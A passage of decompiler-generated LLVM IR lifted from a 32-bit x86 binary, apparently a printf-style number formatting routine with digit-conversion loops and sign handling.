  %v1_80501ac = phi i32 [ %v1_80501ac.pre, %dec_label_pc_80501a9.backedge ], [ %storemerge50, %dec_label_pc_80501a9.preheader ]
  %v4_80501aa = phi i32 [ %v0_80501b0, %dec_label_pc_80501a9.backedge ], [ %v4_80501aa.pre, %dec_label_pc_80501a9.preheader ]
  %v0_80501a9 = phi i32 [ %v0_80501a9.pre, %dec_label_pc_80501a9.backedge ], [ %v0_80501a960, %dec_label_pc_80501a9.preheader ]
  %v1_80501a9 = add i32 %v0_80501a9, -1
  store i32 %v1_80501a9, i32* %ecx.global-to-local, align 4
  %v1_80501aa = inttoptr i32 %v1_80501a9 to i8*
  %v2_80501aa = load i8, i8* %v1_80501aa, align 1
  %v3_80501aa = zext i8 %v2_80501aa to i32
  %v5_80501aa = and i32 %v4_80501aa, -256
  %v6_80501aa = or i32 %v3_80501aa, %v5_80501aa
  %v2_80501ac = add i32 %v6_80501aa, %v1_80501ac
  %v14_80501ac = trunc i32 %v2_80501ac to i8
  store i32 %v2_80501ac, i32* %edx.global-to-local, align 4
  store i8 %v14_80501ac, i8* %v1_80501aa, align 1
  %v0_80501b0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80501b0 = trunc i32 %v0_80501b0 to i8
  %v7_80501b0 = icmp eq i8 %v1_80501b0, 48
  br i1 %v7_80501b0, label %dec_label_pc_80501a9.backedge, label %dec_label_pc_80501b5

dec_label_pc_80501a9.backedge:                    ; preds = %dec_label_pc_80501a9, %dec_label_pc_80501b5
  %v0_80501a9.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_80501ac.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80501a9

dec_label_pc_80501b5:                             ; preds = %dec_label_pc_80501a9
  %tmp146 = icmp ult i8 %v1_80501b0, 58
  br i1 %tmp146, label %dec_label_pc_80501ba, label %dec_label_pc_80501a9.backedge

dec_label_pc_80501ba:                             ; preds = %dec_label_pc_80501b5
  %v2_80501ba = ptrtoint i32* %stack_var_-67 to i32
  store i32 %v2_80501ba, i32* %eax.global-to-local, align 4
  %v0_80501c1 = load i32, i32* %ecx.global-to-local, align 4
  %tmp147 = icmp ugt i32 %v0_80501c1, %v2_80501ba
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp147, label %dec_label_pc_80501c5, label %dec_label_pc_80501d2

dec_label_pc_80501c5:                             ; preds = %dec_label_pc_80501ba
  store i32 %v2_80500a5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80501db

dec_label_pc_80501d2:                             ; preds = %dec_label_pc_80501ba
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_80501ba, i32* %ebx.global-to-local, align 4
  store i32 %v2_80501ba, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80501db

dec_label_pc_80501db:                             ; preds = %dec_label_pc_80501c5, %dec_label_pc_80501d2
  %v0_80501db = phi i32 [ %v0_80501c1, %dec_label_pc_80501c5 ], [ %v2_80501ba, %dec_label_pc_80501d2 ]
  %v1_80501db = add i32 %v0_80501db, 1
  store i32 %v1_80501db, i32* %eax.global-to-local, align 4
  %v2_80501e2 = inttoptr i32 %v1_80501db to i8*
  store i8 0, i8* %v2_80501e2, align 1
  br i1 %v1_8050137, label %dec_label_pc_8050209, label %dec_label_pc_80501ed

dec_label_pc_80501ed:                             ; preds = %dec_label_pc_80501db
  %v0_80501ed = load i32, i32* %esi.global-to-local, align 4
  %v5_80501f0 = icmp slt i32 %v0_80501ed, -4
  br i1 %v5_80501f0, label %dec_label_pc_8050480, label %dec_label_pc_80501f6

dec_label_pc_80501f6:                             ; preds = %dec_label_pc_80501ed
  %v1_80501f6 = load i32, i32* %edi.global-to-local, align 4
  %v8_80501f8 = icmp slt i32 %v1_80501f6, %v0_80501ed
  br i1 %v8_80501f8, label %dec_label_pc_8050480, label %dec_label_pc_80501fe

dec_label_pc_80501fe:                             ; preds = %dec_label_pc_80501f6
  %v2_8050200 = sub i32 %v1_80501f6, %v0_80501ed
  store i32 %v2_8050200, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805021a

dec_label_pc_8050209:                             ; preds = %dec_label_pc_80501db
  %v4_8050209 = zext i8 %stack_var_-186.0.v4_805012d to i32
  %v5_8050209 = load i32, i32* %edx.global-to-local, align 4
  %v6_8050209 = and i32 %v5_8050209, -256
  %v7_8050209 = or i32 %v6_8050209, %v4_8050209
  store i32 %v7_8050209, i32* %edx.global-to-local, align 4
  %v10_8050211 = icmp eq i8 %stack_var_-186.0.v4_805012d, 102
  %v1_8050214 = icmp eq i1 %v10_8050211, false
  br i1 %v1_8050214, label %dec_label_pc_8050480, label %dec_label_pc_8050209.dec_label_pc_805021a_crit_edge

dec_label_pc_8050209.dec_label_pc_805021a_crit_edge: ; preds = %dec_label_pc_8050209
  %v0_805021a.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805021a

dec_label_pc_805021a:                             ; preds = %dec_label_pc_8050209.dec_label_pc_805021a_crit_edge, %dec_label_pc_80501fe
  %v0_805021a = phi i32 [ %v0_805021a.pre, %dec_label_pc_8050209.dec_label_pc_805021a_crit_edge ], [ %v0_80501ed, %dec_label_pc_80501fe ]
  %stack_var_-177.0 = phi i8 [ %stack_var_-186.0.v4_805012d, %dec_label_pc_8050209.dec_label_pc_805021a_crit_edge ], [ 102, %dec_label_pc_80501fe ]
  store i32 %v0_805021a, i32* %edx.global-to-local, align 4
  %v2_805021c = icmp slt i32 %v0_805021a, 0
  %v1_805021e = icmp eq i1 %v2_805021c, false
  br i1 %v1_805021e, label %dec_label_pc_8050224, label %dec_label_pc_8050220

dec_label_pc_8050220:                             ; preds = %dec_label_pc_805021a
  %v0_8050220 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050220 = add i32 %v0_8050220, -1
  store i32 %v1_8050220, i32* %ebx.global-to-local, align 4
  %v1_8050221 = inttoptr i32 %v1_8050220 to i8*
  store i8 48, i8* %v1_8050221, align 1
  %v0_805025b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050224

dec_label_pc_8050224:                             ; preds = %dec_label_pc_805021a, %dec_label_pc_8050480, %dec_label_pc_8050220
  %v1_80502bc = phi i32 [ 0, %dec_label_pc_8050480 ], [ %v0_805021a, %dec_label_pc_805021a ], [ %v0_805025b.pre, %dec_label_pc_8050220 ]
  %stack_var_-177.1 = phi i8 [ %stack_var_-177.2, %dec_label_pc_8050480 ], [ %stack_var_-177.0, %dec_label_pc_805021a ], [ %stack_var_-177.0, %dec_label_pc_8050220 ]
  store i32 1, i32* %stack_var_-148, align 4
  %v2_8050234 = ptrtoint i32* %stack_var_-18 to i32
  store i32 %v2_8050234, i32* %eax.global-to-local, align 4
  %v0_805023f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805023f = inttoptr i32 %v0_805023f to i8*
  %v2_805023f = load i8, i8* %v1_805023f, align 1
  %v3_805023f = zext i8 %v2_805023f to i32
  %v5_805023f = and i32 %v2_8050234, -256
  %v6_805023f = or i32 %v3_805023f, %v5_805023f
  store i32 %v6_805023f, i32* %eax.global-to-local, align 4
  store i32 %v6_805023f, i32* %stack_var_-18, align 4
  %v1_8050248 = add i32 %v0_805023f, 1
  store i32 %v1_8050248, i32* %ebx.global-to-local, align 4
  %v2_8050259 = sub i32 %v1_80501db, %v1_8050248
  store i32 %v2_8050259, i32* %ecx.global-to-local, align 4
  %v1_805025b = icmp eq i32 %v1_80502bc, 0
  %v2_805025b = icmp slt i32 %v1_80502bc, 0
  br i1 %v2_805025b, label %dec_label_pc_80502ae, label %dec_label_pc_805025f

dec_label_pc_805025f:                             ; preds = %dec_label_pc_8050224
  store i32 112, i32* %stack_var_-140, align 4
  store i32 %v1_8050248, i32* %edi.global-to-local, align 4
  %v2_805026f = sub i32 %v1_80502bc, %v2_8050259
  %v8_805026f = xor i32 %v2_8050259, %v1_80502bc
  %v9_805026f = xor i32 %v2_805026f, %v1_80502bc
  %v10_805026f = and i32 %v9_805026f, %v8_805026f
  %v11_805026f = icmp slt i32 %v10_805026f, 0
  %v13_805026f = icmp slt i32 %v2_805026f, 0
  %v2_8050271 = icmp eq i1 %v13_805026f, %v11_805026f
  br i1 %v2_8050271, label %dec_label_pc_8050273, label %dec_label_pc_80502a7

dec_label_pc_8050273:                             ; preds = %dec_label_pc_805025f
  store i32 %v2_805026f, i32* %eax.global-to-local, align 4
  %tmp136 = icmp slt i32 %v2_805026f, 1
  %tmp137 = icmp eq i1 %tmp136, false
  br i1 %tmp137, label %dec_label_pc_8050288, label %dec_label_pc_80502a3

dec_label_pc_8050288:                             ; preds = %dec_label_pc_8050273
  store i32 176, i32* %stack_var_-128, align 4
  br label %dec_label_pc_80502a3

dec_label_pc_80502a3:                             ; preds = %dec_label_pc_8050273, %dec_label_pc_8050288
  %storemerge10.in = phi i32* [ %stack_var_-116, %dec_label_pc_8050288 ], [ %stack_var_-128, %dec_label_pc_8050273 ]
  store i32 -1, i32* %edx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80502c5

dec_label_pc_80502a7:                             ; preds = %dec_label_pc_805025f
  %v1_80502a9 = icmp eq i1 %v1_805025b, false
  br i1 %v1_80502a9, label %dec_label_pc_80502b4, label %dec_label_pc_80502ab

dec_label_pc_80502ab:                             ; preds = %dec_label_pc_80502a7
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80502ae

dec_label_pc_80502ae:                             ; preds = %dec_label_pc_8050224, %dec_label_pc_80502ab
  %v0_80502fe71 = phi i32 [ %v1_80502bc, %dec_label_pc_8050224 ], [ -1, %dec_label_pc_80502ab ]
  %v2_80502ae = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_80502ae, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80502c5

dec_label_pc_80502b4:                             ; preds = %dec_label_pc_80502a7
  %v5_80502b8 = add i32 %v1_8050248, %v1_80502bc
  %v2_80502bc = sub i32 %v2_8050259, %v1_80502bc
  store i32 %v2_80502bc, i32* %ecx.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v2_80502c1 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_80502c1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80502c5

dec_label_pc_80502c5:                             ; preds = %dec_label_pc_80502ae, %dec_label_pc_80502a3, %dec_label_pc_80502b4
  %v0_80502fe70 = phi i32 [ %v0_80502fe71, %dec_label_pc_80502ae ], [ -1, %dec_label_pc_80502a3 ], [ -1, %dec_label_pc_80502b4 ]
  %v0_80502e7 = phi i32 [ %v2_80502ae, %dec_label_pc_80502ae ], [ %storemerge10, %dec_label_pc_80502a3 ], [ %v2_80502c1, %dec_label_pc_80502b4 ]
  %v0_80502d8 = phi i32 [ %v2_8050259, %dec_label_pc_80502ae ], [ 0, %dec_label_pc_80502a3 ], [ %v2_80502bc, %dec_label_pc_80502b4 ]
  %stack_var_-208.0 = phi i32 [ %v1_8050248, %dec_label_pc_80502ae ], [ %v1_8050248, %dec_label_pc_80502a3 ], [ %v5_80502b8, %dec_label_pc_80502b4 ]
  store i32 %tmp108, i32* %eax.global-to-local, align 4
  %v3_80502cc = load i32, i32* %v2_804ff33, align 4
  %v1_80502cf = and i32 %v3_80502cc, 16
  %v2_80502cf = icmp eq i32 %v1_80502cf, 0
  store i32 %v1_80502cf, i32* %edi.global-to-local, align 4
  %v1_80502d6 = icmp eq i1 %v2_80502cf, false
  br i1 %v1_80502d6, label %dec_label_pc_80502e7, label %dec_label_pc_80502d8

dec_label_pc_80502d8:                             ; preds = %dec_label_pc_80502c5
  %v1_80502d8 = icmp eq i32 %v0_80502d8, 0
  %v1_80502da = icmp eq i1 %v1_80502d8, false
  br i1 %v1_80502da, label %dec_label_pc_80502e7, label %dec_label_pc_80502dc

dec_label_pc_80502dc:                             ; preds = %dec_label_pc_80502d8
  br i1 %v12_8050132, label %dec_label_pc_80502fe, label %dec_label_pc_80502e3

dec_label_pc_80502e3:                             ; preds = %dec_label_pc_80502dc
  %v0_80502e3 = load i32, i32* %ebp.global-to-local, align 4
  %tmp138 = icmp slt i32 %v0_80502e3, 1
  br i1 %tmp138, label %dec_label_pc_80502fe, label %dec_label_pc_80502e7

dec_label_pc_80502e7:                             ; preds = %dec_label_pc_80502e3, %dec_label_pc_80502d8, %dec_label_pc_80502c5
  %v1_80502e7 = inttoptr i32 %v0_80502e7 to i32*
  store i32 112, i32* %v1_80502e7, align 4
  %v0_80502ed = load i32, i32* %ebx.global-to-local, align 4
  %v1_80502ed = add i32 %v0_80502ed, 4
  %v2_80502ed = inttoptr i32 %v1_80502ed to i32*
  store i32 1, i32* %v2_80502ed, align 4
  %v0_80502f4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80502f4 = add i32 %v0_80502f4, 8
  %v2_80502f4 = inttoptr i32 %v1_80502f4 to i32*
  store i32 ptrtoint (i32* @global_var_8051f48.149 to i32), i32* %v2_80502f4, align 4
  %v0_80502fb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80502fb = add i32 %v0_80502fb, 12
  store i32 %v1_80502fb, i32* %ebx.global-to-local, align 4
  %v0_80502fe.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80502fe

dec_label_pc_80502fe:                             ; preds = %dec_label_pc_80502e3, %dec_label_pc_80502dc, %dec_label_pc_80502e7
  %v0_8050301 = phi i32 [ %v0_80502e7, %dec_label_pc_80502e3 ], [ %v0_80502e7, %dec_label_pc_80502dc ], [ %v1_80502fb, %dec_label_pc_80502e7 ]
  %v0_80502fe = phi i32 [ %v0_80502fe70, %dec_label_pc_80502e3 ], [ %v0_80502fe70, %dec_label_pc_80502dc ], [ %v0_80502fe.pre, %dec_label_pc_80502e7 ]
  %v1_80502fe = add i32 %v0_80502fe, 1
  %v9_80502fe = icmp slt i32 %v1_80502fe, 0
  store i32 %v1_80502fe, i32* %edx.global-to-local, align 4
  %v1_80502ff = icmp eq i1 %v9_80502fe, false
  br i1 %v1_80502ff, label %dec_label_pc_8050318, label %dec_label_pc_8050301

dec_label_pc_8050301:                             ; preds = %dec_label_pc_80502fe
  %v1_8050301 = inttoptr i32 %v0_8050301 to i32*
  store i32 176, i32* %v1_8050301, align 4
  %v0_8050307 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050309 = sub i32 0, %v0_8050307
  store i32 %v1_8050309, i32* %eax.global-to-local, align 4
  %v1_805030b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805030b = add i32 %v1_805030b, 4
  %v3_805030b = inttoptr i32 %v2_805030b to i32*
  store i32 %v1_8050309, i32* %v3_805030b, align 4
  %v0_805030e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805030e = add i32 %v0_805030e, 8
  %v2_805030e = inttoptr i32 %v1_805030e to i32*
  store i32 ptrtoint (i32* @global_var_8051f3b.148 to i32), i32* %v2_805030e, align 4
  %v0_8050315 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050315 = add i32 %v0_8050315, 12
  store i32 %v1_8050315, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050318

dec_label_pc_8050318:                             ; preds = %dec_label_pc_80502fe, %dec_label_pc_8050301
  %v0_805031c = phi i32 [ %v0_8050301, %dec_label_pc_80502fe ], [ %v1_8050315, %dec_label_pc_8050301 ]
  %v0_8050318 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050318 = icmp eq i32 %v0_8050318, 0
  br i1 %v1_8050318, label %dec_label_pc_805032f, label %dec_label_pc_805031c

dec_label_pc_805031c:                             ; preds = %dec_label_pc_8050318
  %v1_805031c = inttoptr i32 %v0_805031c to i32*
  store i32 112, i32* %v1_805031c, align 4
  %v0_8050322 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050322 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050322 = add i32 %v1_8050322, 4
  %v3_8050322 = inttoptr i32 %v2_8050322 to i32*
  store i32 %v0_8050322, i32* %v3_8050322, align 4
  store i32 %stack_var_-208.0, i32* %eax.global-to-local, align 4
  %v1_8050329 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050329 = add i32 %v1_8050329, 8
  %v3_8050329 = inttoptr i32 %v2_8050329 to i32*
  store i32 %stack_var_-208.0, i32* %v3_8050329, align 4
  %v0_805032c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805032c = add i32 %v0_805032c, 12
  store i32 %v1_805032c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805032f

dec_label_pc_805032f:                             ; preds = %dec_label_pc_8050318, %dec_label_pc_805031c
  %v0_8050345 = phi i32 [ %v0_805031c, %dec_label_pc_8050318 ], [ %v1_805032c, %dec_label_pc_805031c ]
  br i1 %v1_8050137, label %dec_label_pc_805033d, label %dec_label_pc_8050336

dec_label_pc_8050336:                             ; preds = %dec_label_pc_805032f
  br i1 %v2_80502cf, label %dec_label_pc_805035a, label %dec_label_pc_805033d

dec_label_pc_805033d:                             ; preds = %dec_label_pc_8050336, %dec_label_pc_805032f
  %v0_805033d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805033f = load i32, i32* %edx.global-to-local, align 4
  %v2_805033f = sub i32 %v0_805033d, %v1_805033f
  store i32 %v2_805033f, i32* %eax.global-to-local, align 4
  %v1_8050341 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050341 = sub i32 %v2_805033f, %v1_8050341
  %v8_8050341 = xor i32 %v1_8050341, %v2_805033f
  %v9_8050341 = xor i32 %v2_8050341, %v2_805033f
  %v10_8050341 = and i32 %v9_8050341, %v8_8050341
  %v11_8050341 = icmp slt i32 %v10_8050341, 0
  %v13_8050341 = icmp slt i32 %v2_8050341, 0
  %v2_8050343 = icmp eq i1 %v13_8050341, %v11_8050341
  br i1 %v2_8050343, label %dec_label_pc_805035a, label %dec_label_pc_8050345

dec_label_pc_8050345:                             ; preds = %dec_label_pc_805033d
  %v1_8050345 = inttoptr i32 %v0_8050345 to i32*
  store i32 176, i32* %v1_8050345, align 4
  %v0_805034b = load i32, i32* %ebp.global-to-local, align 4
  %v1_805034b = load i32, i32* %eax.global-to-local, align 4
  %v2_805034b = sub i32 %v0_805034b, %v1_805034b
  store i32 %v2_805034b, i32* %ebp.global-to-local, align 4
  %v1_805034d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805034d = add i32 %v1_805034d, 4
  %v3_805034d = inttoptr i32 %v2_805034d to i32*
  store i32 %v2_805034b, i32* %v3_805034d, align 4
  %v0_8050350 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050350 = add i32 %v0_8050350, 8
  %v2_8050350 = inttoptr i32 %v1_8050350 to i32*
  store i32 ptrtoint (i32* @global_var_8051f3b.148 to i32), i32* %v2_8050350, align 4
  %v0_8050357 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050357 = add i32 %v0_8050357, 12
  store i32 %v1_8050357, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805035a

dec_label_pc_805035a:                             ; preds = %dec_label_pc_805033d, %dec_label_pc_8050336, %dec_label_pc_8050345
  %v1_80503dd80 = phi i32 [ %v0_8050345, %dec_label_pc_805033d ], [ %v0_8050345, %dec_label_pc_8050336 ], [ %v1_8050357, %dec_label_pc_8050345 ]
  %v12_805035a = icmp eq i8 %stack_var_-177.1, 102
  br i1 %v12_805035a, label %dec_label_pc_80503d0, label %dec_label_pc_8050361

dec_label_pc_8050361:                             ; preds = %dec_label_pc_805035a
  %v4_8050361 = zext i8 %.141 to i32
  %v5_8050361 = load i32, i32* %edx.global-to-local, align 4
  %v6_8050361 = and i32 %v5_8050361, -256
  %v7_8050361 = or i32 %v6_8050361, %v4_8050361
  store i32 %v7_8050361, i32* %edx.global-to-local, align 4
  %v0_805036c = load i32, i32* %esi.global-to-local, align 4
  %v2_805036c = icmp slt i32 %v0_805036c, 0
  br i1 %v2_805036c, label %dec_label_pc_8050379, label %dec_label_pc_8050382

dec_label_pc_8050379:                             ; preds = %dec_label_pc_8050361
  store i32 %v0_805036c, i32* %edx.global-to-local, align 4
  %v1_805037b = sub i32 0, %v0_805036c
  br label %dec_label_pc_8050382

dec_label_pc_8050382:                             ; preds = %dec_label_pc_8050361, %dec_label_pc_8050379
  %storemerge12 = phi i32 [ %v1_805037b, %dec_label_pc_8050379 ], [ %v0_805036c, %dec_label_pc_8050361 ]
  %storemerge11 = phi i32 [ 45, %dec_label_pc_8050379 ], [ 43, %dec_label_pc_8050361 ]
  store i32 %storemerge12, i32* %edx.global-to-local, align 4
  store i32 %storemerge11, i32* %edi.global-to-local, align 4
  store i32 0, i32* %stack_var_-23, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  %v2_805038f = ptrtoint i32* %stack_var_-23 to i32
  store i32 %v2_805038f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050396

dec_label_pc_8050396:                             ; preds = %dec_label_pc_8050396.backedge, %dec_label_pc_8050382
  %v0_805039c = phi i32 [ %v9_805039f, %dec_label_pc_8050396.backedge ], [ %storemerge12, %dec_label_pc_8050382 ]
  %v0_8050396 = phi i32 [ %v0_8050396.pre, %dec_label_pc_8050396.backedge ], [ %v2_805038f, %dec_label_pc_8050382 ]
  %v1_8050396 = add i32 %v0_8050396, -1
  store i32 %v1_8050396, i32* %ecx.global-to-local, align 4
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_805039e = ashr i32 %v0_805039c, 31
  %v2_805039f = zext i32 %v0_805039c to i64
  %v4_805039f = zext i32 %v1_805039e to i64
  %v5_805039f = mul nuw i64 %v4_805039f, 4294967296
  %v6_805039f = or i64 %v5_805039f, %v2_805039f
  %v8_805039f = sdiv i64 %v6_805039f, 10
  %v9_805039f = trunc i64 %v8_805039f to i32
  store i32 %v9_805039f, i32* %eax.global-to-local, align 4
  %v11_805039f = srem i64 %v6_805039f, 10
  %v12_805039f = trunc i64 %v11_805039f to i8
  %v1_80503a1 = add i8 %v12_805039f, 48
  %v3_80503a4 = inttoptr i32 %v1_8050396 to i8*
  store i8 %v1_80503a1, i8* %v3_80503a4, align 1
  store i32 %v9_805039f, i32* %edx.global-to-local, align 4
  %v0_80503a8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80503a8 = add i32 %v0_80503a8, 1
  store i32 %v1_80503a8, i32* %esi.global-to-local, align 4
  %v9_80503a9 = icmp eq i32 %v0_80503a8, 2
  br i1 %v9_80503a9, label %dec_label_pc_8050396.backedge, label %dec_label_pc_80503ae

dec_label_pc_8050396.backedge:                    ; preds = %dec_label_pc_8050396, %dec_label_pc_80503ae
  %v0_8050396.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050396

dec_label_pc_80503ae:                             ; preds = %dec_label_pc_8050396
  %v2_80503ae = icmp eq i32 %v9_805039f, 0
  %v1_80503b0 = icmp eq i1 %v2_80503ae, false
  br i1 %v1_80503b0, label %dec_label_pc_8050396.backedge, label %dec_label_pc_80503b2

dec_label_pc_80503b2:                             ; preds = %dec_label_pc_80503ae
  %v0_80503b2 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_80503b2, i32* %edx.global-to-local, align 4
  %v1_80503b4 = trunc i32 %v0_80503b2 to i8
  %v2_80503b4 = load i32, i32* %ecx.global-to-local, align 4
  %v3_80503b4 = add i32 %v2_80503b4, -1
  %v4_80503b4 = inttoptr i32 %v3_80503b4 to i8*
  store i8 %v1_80503b4, i8* %v4_80503b4, align 1
  %v0_80503b7 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80503b7 = add i32 %v0_80503b7, -2
  store i32 %v1_80503b7, i32* %eax.global-to-local, align 4
  %v5_80503ba = load i32, i32* %edx.global-to-local, align 4
  %v6_80503ba = and i32 %v5_80503ba, -256
  %v7_80503ba = or i32 %v6_80503ba, %v4_8050361
  store i32 %v7_80503ba, i32* %edx.global-to-local, align 4
  %v4_80503be = inttoptr i32 %v1_80503b7 to i8*
  store i8 %.141, i8* %v4_80503be, align 1
  %v0_80503c1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80503c1 = inttoptr i32 %v0_80503c1 to i32*
  store i32 112, i32* %v1_80503c1, align 4
  %v0_80503c7 = load i32, i32* %esi.global-to-local, align 4
  %v1_80503c7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503c7 = add i32 %v1_80503c7, 4
  %v3_80503c7 = inttoptr i32 %v2_80503c7 to i32*
  store i32 %v0_80503c7, i32* %v3_80503c7, align 4
  %v0_80503ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80503ca = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503ca = add i32 %v1_80503ca, 8
  %v3_80503ca = inttoptr i32 %v2_80503ca to i32*
  store i32 %v0_80503ca, i32* %v3_80503ca, align 4
  %v0_80503cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80503cd = add i32 %v0_80503cd, 12
  store i32 %v1_80503cd, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503d0

dec_label_pc_80503d0:                             ; preds = %dec_label_pc_805035a, %dec_label_pc_804ffd6, %dec_label_pc_80503b2
  %v0_805044a = phi i32 [ %v1_80503dd80, %dec_label_pc_805035a ], [ %v2_8050008, %dec_label_pc_804ffd6 ], [ %v1_80503cd, %dec_label_pc_80503b2 ]
  %v2_80503d0 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_80503d0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503d4

dec_label_pc_80503d4:                             ; preds = %dec_label_pc_80503d4, %dec_label_pc_80503d0
  %v0_80503da = phi i32 [ %v2_80503d0, %dec_label_pc_80503d0 ], [ %v1_80503da, %dec_label_pc_80503d4 ]
  %stack_var_-196.0 = phi i32 [ %v3_804feec, %dec_label_pc_80503d0 ], [ %v5_80503d6, %dec_label_pc_80503d4 ]
  %v1_80503d4 = inttoptr i32 %v0_80503da to i32*
  %v2_80503d4 = load i32, i32* %v1_80503d4, align 4
  store i32 %v2_80503d4, i32* %ecx.global-to-local, align 4
  %v5_80503d6 = sub i32 %stack_var_-196.0, %v2_80503d4
  %v1_80503da = add i32 %v0_80503da, 12
  store i32 %v1_80503da, i32* %eax.global-to-local, align 4
  %v7_80503dd = icmp ult i32 %v1_80503da, %v0_805044a
  br i1 %v7_80503dd, label %dec_label_pc_80503d4, label %dec_label_pc_80503e1

dec_label_pc_80503e1:                             ; preds = %dec_label_pc_80503d4
  store i32 160, i32* %stack_var_-164, align 4
  %v3_80503eb = load i32, i32* %stack_var_-22, align 4
  %v4_80503eb = trunc i32 %v3_80503eb to i8
  %v5_80503eb = icmp eq i8 %v4_80503eb, 0
  %v1_80503f3 = icmp eq i1 %v5_80503eb, false
  %v2_80503f3 = zext i1 %v1_80503f3 to i32
  store i32 %v2_80503f3, i32* %eax.global-to-local, align 4
  %v2_80503fa = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_80503fa, i32* %edx.global-to-local, align 4
  %v2_8050409 = sub i32 %v5_80503d6, %v2_80503f3
  store i32 %v2_8050409, i32* %edi.global-to-local, align 4
  store i32 %v0_805044a, i32* %esi.global-to-local, align 4
  %tmp140 = icmp slt i32 %v2_8050409, 1
  br i1 %tmp140, label %dec_label_pc_805044c, label %dec_label_pc_8050411

dec_label_pc_8050411:                             ; preds = %dec_label_pc_80503e1
  store i32 %tmp108, i32* %edx.global-to-local, align 4
  %v2_8050418 = inttoptr i32 %v1_804ff33 to i8*
  %v3_8050418 = load i8, i8* %v2_8050418, align 1
  %v4_8050418 = and i8 %v3_8050418, 8
  %v5_8050418 = icmp eq i8 %v4_8050418, 0
  br i1 %v5_8050418, label %dec_label_pc_8050433, label %dec_label_pc_805041e

dec_label_pc_805041e:                             ; preds = %dec_label_pc_8050411
  %v1_805041e = inttoptr i32 %v0_805044a to i32*
  store i32 160, i32* %v1_805041e, align 4
  %v1_8050424 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050424 = add i32 %v1_8050424, 4
  %v3_8050424 = inttoptr i32 %v2_8050424 to i32*
  store i32 %v2_8050409, i32* %v3_8050424, align 4
  %v0_8050427 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050427 = add i32 %v0_8050427, 8
  %v2_8050427 = inttoptr i32 %v1_8050427 to i32*
  store i32 ptrtoint (i32* @global_var_8051f3b.148 to i32), i32* %v2_8050427, align 4
  %v0_805042e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805042e = add i32 %v0_805042e, 12
  store i32 %v1_805042e, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805044c

dec_label_pc_8050433:                             ; preds = %dec_label_pc_8050411
  store i32 %tmp108, i32* %ecx.global-to-local, align 4
  %v1_805043a = add i32 %tmp108, 16
  %v2_805043a = inttoptr i32 %v1_805043a to i32*
  %v3_805043a = load i32, i32* %v2_805043a, align 4
  %v9_805043a = icmp eq i32 %v3_805043a, 48
  %v1_805043e = icmp eq i1 %v9_805043a, false
  br i1 %v1_805043e, label %dec_label_pc_8050446, label %dec_label_pc_8050440

dec_label_pc_8050440:                             ; preds = %dec_label_pc_8050433
  %v3_8050440 = load i32, i32* %stack_var_-148, align 4
  %v5_8050440 = add i32 %v3_8050440, %v2_8050409
  store i32 %v5_8050440, i32* %stack_var_-148, align 4
  br label %dec_label_pc_805044a

dec_label_pc_8050446:                             ; preds = %dec_label_pc_8050433
  br label %dec_label_pc_805044a

dec_label_pc_805044a:                             ; preds = %dec_label_pc_8050440, %dec_label_pc_8050446
  store i32 %v0_805044a, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805044c

